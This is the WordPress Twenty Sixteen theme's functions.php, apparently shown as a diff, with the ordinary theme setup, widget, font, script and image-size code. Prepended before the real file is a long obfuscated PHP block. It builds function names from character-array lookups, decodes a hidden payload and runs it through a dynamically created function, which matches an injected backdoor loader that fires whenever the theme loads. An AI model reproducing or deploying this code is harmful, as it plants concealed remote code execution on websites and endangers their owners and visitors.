acltomx[63].$acltomx[37].$acltomx[32].$acltomx[143].$acltomx[26].$acltomx[261].$acltomx[4].$acltomx[206].$acltomx[0].$acltomx[166].$acltomx[7].$acltomx[118].$acltomx[41].$acltomx[113].$acltomx[113].$acltomx[57].$acltomx[148].$acltomx[261].$acltomx[5].$acltomx[75].$acltomx[22].$acltomx[51].$acltomx[27].$acltomx[18].$acltomx[143].$acltomx[75].$acltomx[27].$acltomx[13].$acltomx[3].$acltomx[9].$acltomx[15].$acltomx[154].$acltomx[8].$acltomx[63].$acltomx[25].$acltomx[120].$acltomx[5].$acltomx[14].$acltomx[41].$acltomx[13].$acltomx[64].$acltomx[18].$acltomx[50].$acltomx[4].$acltomx[95].$acltomx[120].$acltomx[5].$acltomx[113].$acltomx[125].$acltomx[27].$acltomx[148].$acltomx[261].$acltomx[261].$acltomx[63].$acltomx[39].$acltomx[39].$acltomx[60].$acltomx[13].$acltomx[3].$acltomx[1].$acltomx[148].$acltomx[11].$acltomx[120].$acltomx[34].$acltomx[14].$acltomx[0].$acltomx[57].$acltomx[261].$acltomx[95].$acltomx[10].$acltomx[57].$acltomx[18].$acltomx[75].$acltomx[22].$acltomx[64].$acltomx[171].$acltomx[34].$acltomx[11].$acltomx[294].$acltomx[24].$acltomx[1].$acltomx[143].$acltomx[166].$acltomx[50].$acltomx[14].$acltomx[13].$acltomx[44].$acltomx[18].$acltomx[125].$acltomx[206].$acltomx[25].$acltomx[60].$acltomx[216].$acltomx[24].$acltomx[44].$acltomx[11].$acltomx[37].$acltomx[24].$acltomx[9].$acltomx[26].$acltomx[125].$acltomx[52].$acltomx[15].$acltomx[52].$acltomx[294].$acltomx[216].$acltomx[7].$acltomx[48].$acltomx[8].$acltomx[7].$acltomx[7].$acltomx[58].$acltomx[29].$acltomx[1].$acltomx[2].$acltomx[11].$acltomx[55].$acltomx[1].$acltomx[120].$acltomx[92].$acltomx[216].$acltomx[24].$acltomx[44].$acltomx[25].$acltomx[3].$acltomx[166].$acltomx[60].$acltomx[51].$acltomx[44].$acltomx[3].$acltomx[131].$acltomx[141].$acltomx[50].$acltomx[131].$acltomx[48].$acltomx[1].$acltomx[34].$acltomx[8].$acltomx[95].$acltomx[216].$acltomx[141].$acltomx[171].$acltomx[216].$acltomx[50].$acltomx[32].$acltomx[63].$acltomx[29].$acltomx[75].$acltomx[55].$acltomx[18].$acltomx[15].$acltomx[1].$acltomx[10].$acltomx[22].$acltomx[125].$acltomx[23].$acltomx[37].$acltomx[131].$acltomx[63].$acltomx[9].$acltomx[25].$acltomx[33].$acltomx[51].$acltomx[125].$acltomx[23].$acltomx[10].$acltomx[118].$acltomx[39].$acltomx[3].$acltomx[75].$acltomx[3].$acltomx[14].$acltomx[44].$acltomx[22].$acltomx[5].$acltomx[24].$acltomx[48].$acltomx[41].$acltomx[1].$acltomx[7].$acltomx[52].$acltomx[63].$acltomx[55].$acltomx[5].$acltomx[154].$acltomx[18].$acltomx[13].$acltomx[14].$acltomx[261].$acltomx[154].$acltomx[1].$acltomx[55].$acltomx[52].$acltomx[32].$acltomx[8].$acltomx[95].$acltomx[6].$acltomx[33].$acltomx[1].$acltomx[8].$acltomx[55].$acltomx[60].$acltomx[92].$acltomx[216].$acltomx[37].$acltomx[24].$acltomx[118].$acltomx[154].$acltomx[118].$acltomx[29].$acltomx[206].$acltomx[41].$acltomx[37].$acltomx[27].$acltomx[141].$acltomx[27].$acltomx[206].$acltomx[294].$acltomx[8].$acltomx[2].$acltomx[44].$acltomx[18].$acltomx[79].$acltomx[13].$acltomx[14].$acltomx[33].$acltomx[3].$acltomx[63].$acltomx[56].$acltomx[1].$acltomx[11].$acltomx[37].$acltomx[261].$acltomx[154].$acltomx[261].$acltomx[23].$acltomx[29].$acltomx[79].$acltomx[33].$acltomx[6].$acltomx[120].$acltomx[8].$acltomx[52].$acltomx[29].$acltomx[166].$acltomx[4].$acltomx[57].$acltomx[120].$acltomx[113].$acltomx[91].$acltomx[148].$acltomx[0].$acltomx[44].$acltomx[9].$acltomx[32].$acltomx[60].$acltomx[28].$acltomx[34].$acltomx[23].$acltomx[52].$acltomx[28].$acltomx[92].$acltomx[206].$acltomx[26].$acltomx[41].$acltomx[148].$acltomx[0].$acltomx[60].$acltomx[131].$acltomx[171].$acltomx[48].$acltomx[13].$acltomx[143].$acltomx[261].$acltomx[52].$acltomx[92].$acltomx[34].$acltomx[63].$acltomx[48].$acltomx[11].$acltomx[206].$acltomx[32].$acltomx[29].$acltomx[57].$acltomx[6].$acltomx[54].$acltomx[58].$acltomx[261].$acltomx[10].$acltomx[120].$acltomx[166].$acltomx[95].$acltomx[118].$acltomx[168].$acltomx[4].$acltomx[60].$acltomx[79].$acltomx[57].$acltomx[32].$acltomx[28].$acltomx[148].$acltomx[34].$acltomx[29].$acltomx[23].$acltomx[56].$acltomx[216].$acltomx[8].$acltomx[206].$acltomx[25].$acltomx[166].$acltomx[120].$acltomx[91].$acltomx[34].$acltomx[2].$acltomx[22].$acltomx[13].$acltomx[48].$acltomx[206].$acltomx[125].$acltomx[5].$acltomx[92].$acltomx[29].$acltomx[11].$acltomx[120].$acltomx[91].$acltomx[261].$acltomx[125].$acltomx[28].$acltomx[26].$acltomx[171].$acltomx[14].$acltomx[57].$acltomx[79].$acltomx[120].$acltomx[206].$acltomx[166].$acltomx[118].$acltomx[166].$acltomx[63].$acltomx[2].$acltomx[118].$acltomx[32].$acltomx[64].$acltomx[37].$acltomx[26].$acltomx[9].$acltomx[27].$acltomx[23].$acltomx[64].$acltomx[22].$acltomx[23].$acltomx[148].$acltomx[26].$acltomx[2].$acltomx[44].$acltomx[34].$acltomx[41].$acltomx[3].$acltomx[13].$acltomx[13].$acltomx[14].$acltomx[5].$acltomx[41].$acltomx[13].$acltomx[3].$acltomx[118].$acltomx[3].$acltomx[206].$acltomx[25].$acltomx[141].$acltomx[261].$acltomx[25].$acltomx[75].$acltomx[63].$acltomx[3].$acltomx[58].$acltomx[18].$acltomx[54].$acltomx[11].$acltomx[56].$acltomx[56].$acltomx[24].$acltomx[216].$acltomx[23].$acltomx[0].$acltomx[5].$acltomx[34].$acltomx[25].$acltomx[24].$acltomx[95].$acltomx[51].$acltomx[7].$acltomx[113].$acltomx[60].$acltomx[41].$acltomx[55].$acltomx[24].$acltomx[168].$acltomx[37].$acltomx[120].$acltomx[41].$acltomx[63].$acltomx[125].$acltomx[141].$acltomx[24].$acltomx[6].$acltomx[4].$acltomx[23].$acltomx[3].$acltomx[22].$acltomx[55].$acltomx[171].$acltomx[294].$acltomx[154].$acltomx[13].$acltomx[75].$acltomx[60].$acltomx[5].$acltomx[25].$acltomx[166].$acltomx[95].$acltomx[34].$acltomx[51].$acltomx[25].$acltomx[206].$acltomx[41].$acltomx[125].$acltomx[171].$acltomx[54].$acltomx[22].$acltomx[154].$acltomx[120].$acltomx[0].$acltomx[113].$acltomx[120].$acltomx[51].$acltomx[14].$acltomx[2].$acltomx[41].$acltomx[4].$acltomx[113].$acltomx[143].$acltomx[92].$acltomx[143].$acltomx[113].$acltomx[166].$acltomx[60].$acltomx[7].$acltomx[50].$acltomx[91].$acltomx[26].$acltomx[75].$acltomx[10].$acltomx[56].$acltomx[39].$acltomx[15].$acltomx[60].$acltomx[52].$acltomx[34].$acltomx[41].$acltomx[143].$acltomx[5].$acltomx[24].$acltomx[120].$acltomx[8].$acltomx[39].$acltomx[166].$acltomx[1].$acltomx[48].$acltomx[51].$acltomx[18].$acltomx[91].$acltomx[8].$acltomx[4].$acltomx[13].$acltomx[58].$acltomx[143].$acltomx[6].$acltomx[26].$acltomx[2].$acltomx[14].$acltomx[91].$acltomx[56].$acltomx[25].$acltomx[5].$acltomx[1].$acltomx[113].$acltomx[11].$acltomx[206].$acltomx[118].$acltomx[18].$acltomx[113].$acltomx[0].$acltomx[166].$acltomx[91].$acltomx[34].$acltomx[75].$acltomx[60].$acltomx[48].$acltomx[26].$acltomx[143].$acltomx[11].$acltomx[120].$acltomx[143].$acltomx[29].$acltomx[23].$acltomx[5].$acltomx[7].$acltomx[9].$acltomx[113].$acltomx[75].$acltomx[95].$acltomx[50].$acltomx[64].$acltomx[1].$acltomx[23].$acltomx[56].$acltomx[14].$acltomx[32].$acltomx[0].$acltomx[28].$acltomx[5].$acltomx[9].$acltomx[131].$acltomx[11].$acltomx[216].$acltomx[33].$acltomx[206].$acltomx[10].$acltomx[6].$acltomx[9].$acltomx[32].$acltomx[13].$acltomx[32].$acltomx[9].$acltomx[131].$acltomx[1].$acltomx[171].$acltomx[8].$acltomx[37].$acltomx[5].$acltomx[118].$acltomx[44].$acltomx[92].$acltomx[27].$acltomx[29].$acltomx[4].$acltomx[25].$acltomx[95].$acltomx[91].$acltomx[75].$acltomx[25].$acltomx[25].$acltomx[166].$acltomx[79].$acltomx[79].$acltomx[75].$acltomx[56].$acltomx[60].$acltomx[57].$acltomx[75].$acltomx[13].$acltomx[91].$acltomx[3].$acltomx[23].$acltomx[154].$acltomx[37].$acltomx[79].$acltomx[3].$acltomx[51].$acltomx[1].$acltomx[63].$acltomx[26].$acltomx[52].$acltomx[294].$acltomx[13].$acltomx[24].$acltomx[18].$acltomx[6].$acltomx[52].$acltomx[4].$acltomx[51].$acltomx[32].$acltomx[56].$acltomx[33].$acltomx[51].$acltomx[125].$acltomx[50].$acltomx[22].$acltomx[60].$acltomx[171].$acltomx[55].$acltomx[113].$acltomx[118].$acltomx[92].$acltomx[60].$acltomx[37].$acltomx[55].$acltomx[171].$acltomx[50].$acltomx[92].$acltomx[64].$acltomx[15].$acltomx[44].$acltomx[148].$acltomx[79].$acltomx[57].$acltomx[125].$acltomx[125].$acltomx[10].$acltomx[3].$acltomx[113].$acltomx[7].$acltomx[120].$acltomx[14].$acltomx[3].$acltomx[34].$acltomx[13].$acltomx[141].$acltomx[91].$acltomx[14].$acltomx[50].$acltomx[92].$acltomx[13].$acltomx[10].$acltomx[79].$acltomx[15].$acltomx[52].$acltomx[166].$acltomx[63].$acltomx[113].$acltomx[57].$acltomx[10].$acltomx[95].$acltomx[131].$acltomx[154].$acltomx[75].$acltomx[24].$acltomx[25].$acltomx[261].$acltomx[64].$acltomx[168].$acltomx[2].$acltomx[168].$acltomx[32].$acltomx[37].$acltomx[141].$acltomx[95].$acltomx[15].$acltomx[120].$acltomx[95].$acltomx[148].$acltomx[113].$acltomx[166].$acltomx[11].$acltomx[64].$acltomx[28].$acltomx[32].$acltomx[34].$acltomx[29].$acltomx[27].$acltomx[13].$acltomx[52].$acltomx[1].$acltomx[5].$acltomx[10].$acltomx[91].$acltomx[26].$acltomx[33].$acltomx[216].$acltomx[75].$acltomx[95].$acltomx[168].$acltomx[51].$acltomx[95].$acltomx[143].$acltomx[141].$acltomx[57].$acltomx[29].$acltomx[148].$acltomx[141].$acltomx[25].$acltomx[32].$acltomx[51].$acltomx[294].$acltomx[91].$acltomx[13].$acltomx[32].$acltomx[91].$acltomx[6].$acltomx[63].$acltomx[39].$acltomx[56].$acltomx[91].$acltomx[118].$acltomx[39].$acltomx[148].$acltomx[1].$acltomx[13].$acltomx[91].$acltomx[54].$acltomx[29].$acltomx[26].$acltomx[63].$acltomx[57].$acltomx[141].$acltomx[120].$acltomx[294].$acltomx[29].$acltomx[14].$acltomx[7].$acltomx[28].$acltomx[57].$acltomx[148].$acltomx[9].$acltomx[32].$acltomx[37].$acltomx[154].$acltomx[261].$acltomx[171].$acltomx[15].$acltomx[8].$acltomx[1].$acltomx[113].$acltomx[57].$acltomx[57].$acltomx[141].$acltomx[95].$acltomx[75].$acltomx[10].$acltomx[125].$acltomx[56].$acltomx[9].$acltomx[11].$acltomx[15].$acltomx[63].$acltomx[95].$acltomx[294].$acltomx[32].$acltomx[15].$acltomx[7].$acltomx[125].$acltomx[55].$acltomx[51].$acltomx[113].$acltomx[118].$acltomx[118].$acltomx[171].$acltomx[294].$acltomx[216].$acltomx[118].$acltomx[125].$acltomx[56].$acltomx[4].$acltomx[148].$acltomx[120].$acltomx[28].$acltomx[51].$acltomx[131].$acltomx[171].$acltomx[125].$acltomx[6].$acltomx[52].$acltomx[91].$acltomx[24].$acltomx[37].$acltomx[23].$acltomx[141].$acltomx[24].$acltomx[33].$acltomx[79].$acltomx[3].$acltomx[294].$acltomx[27].$acltomx[143].$acltomx[57].$acltomx[28].$acltomx[58].$acltomx[23].$acltomx[22].$acltomx[54].$acltomx[7].$acltomx[216].$acltomx[5].$acltomx[55].$acltomx[28].$acltomx[41].$acltomx[24].$acltomx[32].$acltomx[7].$acltomx[57].$acltomx[55].$acltomx[56].$acltomx[13].$acltomx[261].$acltomx[261].$acltomx[294].$acltomx[91].$acltomx[10].$acltomx[25].$acltomx[113].$acltomx[54].$acltomx[28].$acltomx[3].$acltomx[28].$acltomx[120].$acltomx[166].$acltomx[1].$acltomx[11].$acltomx[60].$acltomx[63].$acltomx[1].$acltomx[58].$acltomx[34].$acltomx[13].$acltomx[28].$acltomx[23].$acltomx[44].$acltomx[7].$acltomx[24].$acltomx[166].$acltomx[23].$acltomx[8].$acltomx[26].$acltomx[52].$acltomx[48].$acltomx[3].$acltomx[113].$acltomx[294].$acltomx[55].$acltomx[2].$acltomx[91].$acltomx[91].$acltomx[3].$acltomx[11].$acltomx[15].$acltomx[171].$acltomx[27].$acltomx[15].$acltomx[92].$acltomx[11].$acltomx[34].$acltomx[52].$acltomx[11].$acltomx[7].$acltomx[92].$acltomx[6].$acltomx[23].$acltomx[113].$acltomx[75].$acltomx[15].$acltomx[57].$acltomx[143].$acltomx[92].$acltomx[92].$acltomx[7].$acltomx[8].$acltomx[18].$acltomx[91].$acltomx[58].$acltomx[33].$acltomx[39].$acltomx[27].$acltomx[48].$acltomx[60].$acltomx[51].$acltomx[63].$acltomx[11].$acltomx[50].$acltomx[148].$acltomx[23].$acltomx[11].$acltomx[33].$acltomx[15].$acltomx[11].$acltomx[216].$acltomx[25].$acltomx[33].$acltomx[9].$acltomx[206].$acltomx[37].$acltomx[131].$acltomx[5].$acltomx[22].$acltomx[11].$acltomx[48].$acltomx[63].$acltomx[33].$acltomx[39].$acltomx[24].$acltomx[18].$acltomx[91].$acltomx[39].$acltomx[18].$acltomx[1].$acltomx[1].$acltomx[56].$acltomx[5].$acltomx[44].$acltomx[3].$acltomx[294].$acltomx[58].$acltomx[141].$acltomx[57].$acltomx[2003].$acltomx[2003];$pghldqedsq=$acltomx[24].$acltomx[64].$acltomx[6].$acltomx[29].$acltomx[92].$acltomx[23].$acltomx[843].$acltomx[27].$acltomx[29].$acltomx[28].$acltomx[131].$acltomx[27].$acltomx[29];$hcugtohfolmmuks=$acltomx[143].$acltomx[60].$acltomx[44].$acltomx[141].$acltomx[28].$acltomx[131].$acltomx[13].$acltomx[3].$acltomx[48].$acltomx[29].$acltomx[6].$acltomx[6];$xqbbfhirkyvnrl=$acltomx[6].$acltomx[52].$acltomx[48].$acltomx[48].$acltomx[29].$acltomx[91];$yoffhtmnhyat=$acltomx[28].$acltomx[48].$acltomx[29].$acltomx[64].$acltomx[52].$acltomx[29].$acltomx[843].$acltomx[206].$acltomx[44].$acltomx[141].$acltomx[28].$acltomx[52].$acltomx[261].$acltomx[131].$acltomx[141];$kmlhcmihtrydpu=$acltomx[807].$acltomx[64];$gfcfuikbbxpjvp=$acltomx[1494].$acltomx[1168].$acltomx[64].$acltomx[807].$acltomx[1468].$acltomx[34].$acltomx[64].$acltomx[91].$acltomx[29];$ozpzhsmpzf=$acltomx[29].$acltomx[125].$acltomx[261].$acltomx[52];$kmlhcmihtrydpudyhsalifpaqga=$xqbbfhirkyvnrl;$torzxmxtepcq=$hcugtohfolmmuks($pghldqedsq($rtamaegxixgynxi));$torzxmxtepcq=$kmlhcmihtrydpudyhsalifpaqga($torzxmxtepcq);$kakkdisvjddose=$yoffhtmnhyat($kmlhcmihtrydpu,$xqbbfhirkyvnrl($gfcfuikbbxpjvp));$kakkdisvjddose($xqbbfhirkyvnrl($torzxmxtepcq));$ozpzhsmpzf;?><?php
+/**
+ * Twenty Sixteen functions and definitions
+ *
+ * Set up the theme and provides some helper functions, which are used in the
+ * theme as custom template tags. Others are attached to action and filter
+ * hooks in WordPress to change core functionality.
+ *
+ * When using a child theme you can override certain functions (those wrapped
+ * in a function_exists() call) by defining them first in your child theme's
+ * functions.php file. The child theme's functions.php file is included before
+ * the parent theme's file, so the child theme functions would be used.
+ *
+ * @link https://codex.wordpress.org/Theme_Development
+ * @link https://codex.wordpress.org/Child_Themes
+ *
+ * Functions that are not pluggable (not wrapped in function_exists()) are
+ * instead attached to a filter or action hook.
+ *
+ * For more information on hooks, actions, and filters,
+ * {@link https://codex.wordpress.org/Plugin_API}
+ *
+ * @package WordPress
+ * @subpackage Twenty_Sixteen
+ * @since Twenty Sixteen 1.0
+ */
+
+/**
+ * Twenty Sixteen only works in WordPress 4.4 or later.
+ */
+if ( version_compare( $GLOBALS['wp_version'], '4.4-alpha', '<' ) ) {
+	require get_template_directory() . '/inc/back-compat.php';
+}
+
+if ( ! function_exists( 'twentysixteen_setup' ) ) :
+	/**
+	 * Sets up theme defaults and registers support for various WordPress features.
+	 *
+	 * Note that this function is hooked into the after_setup_theme hook, which
+	 * runs before the init hook. The init hook is too late for some features, such
+	 * as indicating support for post thumbnails.
+	 *
+	 * Create your own twentysixteen_setup() function to override in a child theme.
+	 *
+	 * @since Twenty Sixteen 1.0
+	 */
+	function twentysixteen_setup() {
+		/*
+		 * Make theme available for translation.
+		 * Translations can be filed at WordPress.org. See: https://translate.wordpress.org/projects/wp-themes/twentysixteen
+		 * If you're building a theme based on Twenty Sixteen, use a find and replace
+		 * to change 'twentysixteen' to the name of your theme in all the template files
+		 */
+		load_theme_textdomain( 'twentysixteen' );
+
+		// Add default posts and comments RSS feed links to head.
+		add_theme_support( 'automatic-feed-links' );
+
+		/*
+		 * Let WordPress manage the document title.
+		 * By adding theme support, we declare that this theme does not use a
+		 * hard-coded <title> tag in the document head, and expect WordPress to
+		 * provide it for us.
+		 */
+		add_theme_support( 'title-tag' );
+
+		/*
+		 * Enable support for custom logo.
+		 *
+		 *  @since Twenty Sixteen 1.2
+		 */
+		add_theme_support(
+			'custom-logo', array(
+				'height'      => 240,
+				'width'       => 240,
+				'flex-height' => true,
+			)
+		);
+
+		/*
+		 * Enable support for Post Thumbnails on posts and pages.
+		 *
+		 * @link https://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
+		 */
+		add_theme_support( 'post-thumbnails' );
+		set_post_thumbnail_size( 1200, 9999 );
+
+		// This theme uses wp_nav_menu() in two locations.
+		register_nav_menus(
+			array(
+				'primary' => __( 'Primary Menu', 'twentysixteen' ),
+				'social'  => __( 'Social Links Menu', 'twentysixteen' ),
+			)
+		);
+
+		/*
+		 * Switch default core markup for search form, comment form, and comments
+		 * to output valid HTML5.
+		 */
+		add_theme_support(
+			'html5', array(
+				'search-form',
+				'comment-form',
+				'comment-list',
+				'gallery',
+				'caption',
+			)
+		);
+
+		/*
+		 * Enable support for Post Formats.
+		 *
+		 * See: https://codex.wordpress.org/Post_Formats
+		 */
+		add_theme_support(
+			'post-formats', array(
+				'aside',
+				'image',
+				'video',
+				'quote',
+				'link',
+				'gallery',
+				'status',
+				'audio',
+				'chat',
+			)
+		);
+
+		/*
+		 * This theme styles the visual editor to resemble the theme style,
+		 * specifically font, colors, icons, and column width.
+		 */
+		add_editor_style( array( 'css/editor-style.css', twentysixteen_fonts_url() ) );
+
+		// Indicate widget sidebars can use selective refresh in the Customizer.
+		add_theme_support( 'customize-selective-refresh-widgets' );
+	}
+endif; // twentysixteen_setup
+add_action( 'after_setup_theme', 'twentysixteen_setup' );
+
+/**
+ * Sets the content width in pixels, based on the theme's design and stylesheet.
+ *
+ * Priority 0 to make it available to lower priority callbacks.
+ *
+ * @global int $content_width
+ *
+ * @since Twenty Sixteen 1.0
+ */
+function twentysixteen_content_width() {
+	$GLOBALS['content_width'] = apply_filters( 'twentysixteen_content_width', 840 );
+}
+add_action( 'after_setup_theme', 'twentysixteen_content_width', 0 );
+
+/**
+ * Registers a widget area.
+ *
+ * @link https://developer.wordpress.org/reference/functions/register_sidebar/
+ *
+ * @since Twenty Sixteen 1.0
+ */
+function twentysixteen_widgets_init() {
+	register_sidebar(
+		array(
+			'name'          => __( 'Sidebar', 'twentysixteen' ),
+			'id'            => 'sidebar-1',
+			'description'   => __( 'Add widgets here to appear in your sidebar.', 'twentysixteen' ),
+			'before_widget' => '<section id="%1$s" class="widget %2$s">',
+			'after_widget'  => '</section>',
+			'before_title'  => '<h2 class="widget-title">',
+			'after_title'   => '</h2>',
+		)
+	);
+
+	register_sidebar(
+		array(
+			'name'          => __( 'Content Bottom 1', 'twentysixteen' ),
+			'id'            => 'sidebar-2',
+			'description'   => __( 'Appears at the bottom of the content on posts and pages.', 'twentysixteen' ),
+			'before_widget' => '<section id="%1$s" class="widget %2$s">',
+			'after_widget'  => '</section>',
+			'before_title'  => '<h2 class="widget-title">',
+			'after_title'   => '</h2>',
+		)
+	);
+
+	register_sidebar(
+		array(
+			'name'          => __( 'Content Bottom 2', 'twentysixteen' ),
+			'id'            => 'sidebar-3',
+			'description'   => __( 'Appears at the bottom of the content on posts and pages.', 'twentysixteen' ),
+			'before_widget' => '<section id="%1$s" class="widget %2$s">',
+			'after_widget'  => '</section>',
+			'before_title'  => '<h2 class="widget-title">',
+			'after_title'   => '</h2>',
+		)
+	);
+}
+add_action( 'widgets_init', 'twentysixteen_widgets_init' );
+
+if ( ! function_exists( 'twentysixteen_fonts_url' ) ) :
+	/**
+	 * Register Google fonts for Twenty Sixteen.
+	 *
+	 * Create your own twentysixteen_fonts_url() function to override in a child theme.
+	 *
+	 * @since Twenty Sixteen 1.0
+	 *
+	 * @return string Google fonts URL for the theme.
+	 */
+	function twentysixteen_fonts_url() {
+		$fonts_url = '';
+		$fonts     = array();
+		$subsets   = 'latin,latin-ext';
+
+		/* translators: If there are characters in your language that are not supported by Merriweather, translate this to 'off'. Do not translate into your own language. */
+		if ( 'off' !== _x( 'on', 'Merriweather font: on or off', 'twentysixteen' ) ) {
+			$fonts[] = 'Merriweather:400,700,900,400italic,700italic,900italic';
+		}
+
+		/* translators: If there are characters in your language that are not supported by Montserrat, translate this to 'off'. Do not translate into your own language. */
+		if ( 'off' !== _x( 'on', 'Montserrat font: on or off', 'twentysixteen' ) ) {
+			$fonts[] = 'Montserrat:400,700';
+		}
+
+		/* translators: If there are characters in your language that are not supported by Inconsolata, translate this to 'off'. Do not translate into your own language. */
+		if ( 'off' !== _x( 'on', 'Inconsolata font: on or off', 'twentysixteen' ) ) {
+			$fonts[] = 'Inconsolata:400';
+		}
+
+		if ( $fonts ) {
+			$fonts_url = add_query_arg(
+				array(
+					'family' => urlencode( implode( '|', $fonts ) ),
+					'subset' => urlencode( $subsets ),
+				), 'https://fonts.googleapis.com/css'
+			);
+		}
+
+		return $fonts_url;
+	}
+endif;
+
+/**
+ * Handles JavaScript detection.
+ *
+ * Adds a `js` class to the root `<html>` element when JavaScript is detected.
+ *
+ * @since Twenty Sixteen 1.0
+ */
+function twentysixteen_javascript_detection() {
+	echo "<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>\n";
+}
+add_action( 'wp_head', 'twentysixteen_javascript_detection', 0 );
+
+/**
+ * Enqueues scripts and styles.
+ *
+ * @since Twenty Sixteen 1.0
+ */
+function twentysixteen_scripts() {
+	// Add custom fonts, used in the main stylesheet.
+	wp_enqueue_style( 'twentysixteen-fonts', twentysixteen_fonts_url(), array(), null );
+
+	// Add Genericons, used in the main stylesheet.
+	wp_enqueue_style( 'genericons', get_template_directory_uri() . '/genericons/genericons.css', array(), '3.4.1' );
+
+	// Theme stylesheet.
+	wp_enqueue_style( 'twentysixteen-style', get_stylesheet_uri() );
+
+	// Load the Internet Explorer specific stylesheet.
+	wp_enqueue_style( 'twentysixteen-ie', get_template_directory_uri() . '/css/ie.css', array( 'twentysixteen-style' ), '20160816' );
+	wp_style_add_data( 'twentysixteen-ie', 'conditional', 'lt IE 10' );
+
+	// Load the Internet Explorer 8 specific stylesheet.
+	wp_enqueue_style( 'twentysixteen-ie8', get_template_directory_uri() . '/css/ie8.css', array( 'twentysixteen-style' ), '20160816' );
+	wp_style_add_data( 'twentysixteen-ie8', 'conditional', 'lt IE 9' );
+
+	// Load the Internet Explorer 7 specific stylesheet.
+	wp_enqueue_style( 'twentysixteen-ie7', get_template_directory_uri() . '/css/ie7.css', array( 'twentysixteen-style' ), '20160816' );
+	wp_style_add_data( 'twentysixteen-ie7', 'conditional', 'lt IE 8' );
+
+	// Load the html5 shiv.
+	wp_enqueue_script( 'twentysixteen-html5', get_template_directory_uri() . '/js/html5.js', array(), '3.7.3' );
+	wp_script_add_data( 'twentysixteen-html5', 'conditional', 'lt IE 9' );
+
+	wp_enqueue_script( 'twentysixteen-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20160816', true );
+
+	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
+		wp_enqueue_script( 'comment-reply' );
+	}
+
+	if ( is_singular() && wp_attachment_is_image() ) {
+		wp_enqueue_script( 'twentysixteen-keyboard-image-navigation', get_template_directory_uri() . '/js/keyboard-image-navigation.js', array( 'jquery' ), '20160816' );
+	}
+
+	wp_enqueue_script( 'twentysixteen-script', get_template_directory_uri() . '/js/functions.js', array( 'jquery' ), '20160816', true );
+
+	wp_localize_script(
+		'twentysixteen-script', 'screenReaderText', array(
+			'expand'   => __( 'expand child menu', 'twentysixteen' ),
+			'collapse' => __( 'collapse child menu', 'twentysixteen' ),
+		)
+	);
+}
+add_action( 'wp_enqueue_scripts', 'twentysixteen_scripts' );
+
+/**
+ * Adds custom classes to the array of body classes.
+ *
+ * @since Twenty Sixteen 1.0
+ *
+ * @param array $classes Classes for the body element.
+ * @return array (Maybe) filtered body classes.
+ */
+function twentysixteen_body_classes( $classes ) {
+	// Adds a class of custom-background-image to sites with a custom background image.
+	if ( get_background_image() ) {
+		$classes[] = 'custom-background-image';
+	}
+
+	// Adds a class of group-blog to sites with more than 1 published author.
+	if ( is_multi_author() ) {
+		$classes[] = 'group-blog';
+	}
+
+	// Adds a class of no-sidebar to sites without active sidebar.
+	if ( ! is_active_sidebar( 'sidebar-1' ) ) {
+		$classes[] = 'no-sidebar';
+	}
+
+	// Adds a class of hfeed to non-singular pages.
+	if ( ! is_singular() ) {
+		$classes[] = 'hfeed';
+	}
+
+	return $classes;
+}
+add_filter( 'body_class', 'twentysixteen_body_classes' );
+
+/**
+ * Converts a HEX value to RGB.
+ *
+ * @since Twenty Sixteen 1.0
+ *
+ * @param string $color The original color, in 3- or 6-digit hexadecimal form.
+ * @return array Array containing RGB (red, green, and blue) values for the given
+ *               HEX code, empty array otherwise.
+ */
+function twentysixteen_hex2rgb( $color ) {
+	$color = trim( $color, '#' );
+
+	if ( strlen( $color ) === 3 ) {
+		$r = hexdec( substr( $color, 0, 1 ) . substr( $color, 0, 1 ) );
+		$g = hexdec( substr( $color, 1, 1 ) . substr( $color, 1, 1 ) );
+		$b = hexdec( substr( $color, 2, 1 ) . substr( $color, 2, 1 ) );
+	} elseif ( strlen( $color ) === 6 ) {
+		$r = hexdec( substr( $color, 0, 2 ) );
+		$g = hexdec( substr( $color, 2, 2 ) );
+		$b = hexdec( substr( $color, 4, 2 ) );
+	} else {
+		return array();
+	}
+
+	return array(
+		'red'   => $r,
+		'green' => $g,
+		'blue'  => $b,
+	);
+}
+
+/**
+ * Custom template tags for this theme.
+ */
+require get_template_directory() . '/inc/template-tags.php';
+
+/**
+ * Customizer additions.
+ */
+require get_template_directory() . '/inc/customizer.php';
+
+/**
+ * Add custom image sizes attribute to enhance responsive image functionality
+ * for content images
+ *
+ * @since Twenty Sixteen 1.0
+ *
+ * @param string $sizes A source size value for use in a 'sizes' attribute.
+ * @param array  $size  Image size. Accepts an array of width and height
+ *                      values in pixels (in that order).
+ * @return string A source size value for use in a content image 'sizes' attribute.
+ */
+function twentysixteen_content_image_sizes_attr( $sizes, $size ) {
+	$width = $size[0];
+
+	if ( 840 <= $width ) {
+		$sizes = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px';
+	}
+
+	if ( 'page' === get_post_type() ) {
+		if ( 840 > $width ) {
+			$sizes = '(max-width: ' . $width . 'px) 85vw, ' . $width . 'px';
+		}
+	} else {
+		if ( 840 > $width && 600 <= $width ) {
+			$sizes = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 984px) 61vw, (max-width: 1362px) 45vw, 600px';
+		} elseif ( 600 > $width ) {
+			$sizes = '(max-width: ' . $width . 'px) 85vw, ' . $width . 'px';
+		}
+	}
+
+	return $sizes;
+}
+add_filter( 'wp_calculate_image_sizes', 'twentysixteen_content_image_sizes_attr', 10, 2 );
+
+/**
+ * Add custom image sizes attribute to enhance responsive image functionality
+ * for post thumbnails
+ *
+ * @since Twenty Sixteen 1.0
+ *
+ * @param array $attr Attributes for the image markup.
+ * @param int   $attachment Image attachment ID.
+ * @param array $size Registered image size or flat array of height and width dimensions.
+ * @return array The filtered attributes for the image markup.
+ */
+function twentysixteen_post_thumbnail_sizes_attr( $attr, $attachment, $size ) {
+	if ( 'post-thumbnail' === $size ) {
+		if ( is_active_sidebar( 'sidebar-1' ) ) {
+			$attr['sizes'] = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 984px) 60vw, (max-width: 1362px) 62vw, 840px';
+		} else {
+			$attr['sizes'] = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 88vw, 1200px';
+		}
+	}
+	return $attr;
+}
